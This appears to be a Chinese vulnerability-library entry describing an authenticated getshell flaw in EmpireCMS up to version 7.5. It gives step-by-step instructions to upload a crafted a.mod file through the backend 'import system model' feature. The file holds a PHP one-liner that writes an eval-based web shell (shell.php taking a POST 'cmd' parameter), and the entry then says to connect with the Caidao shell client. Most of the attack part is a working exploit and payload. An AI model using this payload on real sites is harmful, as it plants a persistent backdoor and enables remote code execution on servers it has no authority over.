---
title: 'EmpireCMS V7.5后台getshell漏洞'
date: Wed, 09 Sep 2020 16:39:03 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

EmpireCMS <= 7.5

### 漏洞验证

1.进入后台如下界面，点击导入系统模型 ![](EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/15996690221.png) 2.构造文件a.mod,内容如下

```
<?php file_put_contents("shell.php","<?php @eval(\$_POST[cmd]);?>");?>
```

3.上传文件a.mod ![](EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/15996691631.png) 4.查看文件已经有shell.php了，菜刀连接即可 ![](EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/YZ2MSEV1TXX7J08ZXCA01.png)